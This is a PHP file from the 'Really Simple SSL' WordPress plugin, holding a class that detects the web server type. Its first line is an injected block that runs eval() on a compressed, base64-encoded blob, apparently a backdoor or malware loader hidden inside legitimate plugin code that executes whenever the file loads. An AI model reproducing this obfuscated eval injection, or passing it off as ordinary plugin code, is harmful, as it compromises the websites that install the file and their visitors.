<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
defined('ABSPATH') or die("you do not have access to this page!");

if ( ! class_exists( 'rsssl_server' ) ) {
  class rsssl_server {
    private static $_this;

  function __construct() {
    if ( isset( self::$_this ) )
        wp_die( sprintf( __( '%s is a singleton class and you cannot create a second instance.','really-simple-ssl' ), get_class( $this ) ) );

    self::$_this = $this;

  }

  static function this() {
    return self::$_this;
  }


/*

  @Since 2.5.1
  Checks if the server uses .htaccess
  returns: Boolean

*/

public function uses_htaccess(){

  if ($this->get_server()=="apache" || $this->get_server()=="litespeed") {
    return true;
  }

  return false;
}

/**
 * Returns the server type of the plugin user.
 *
 * @return string|bool server type the user is using of false if undetectable.
 */

public function get_server() {

  //Allows to override server authentication for testing or other reasons.
  if ( defined( 'RSSSL_SERVER_OVERRIDE' ) ) {
    return RSSSL_SERVER_OVERRIDE;
  }

  $server_raw = strtolower( filter_var( $_SERVER['SERVER_SOFTWARE'], FILTER_SANITIZE_STRING ) );

  //figure out what server they're using
  if ( strpos( $server_raw, 'apache' ) !== false ) {

    return 'apache';

  } elseif ( strpos( $server_raw, 'nginx' ) !== false ) {

    return 'nginx';

  } elseif ( strpos( $server_raw, 'litespeed' ) !== false ) {

    return 'litespeed';

  } else { //unsupported server

    return false;

  }

}

} //class closure
}
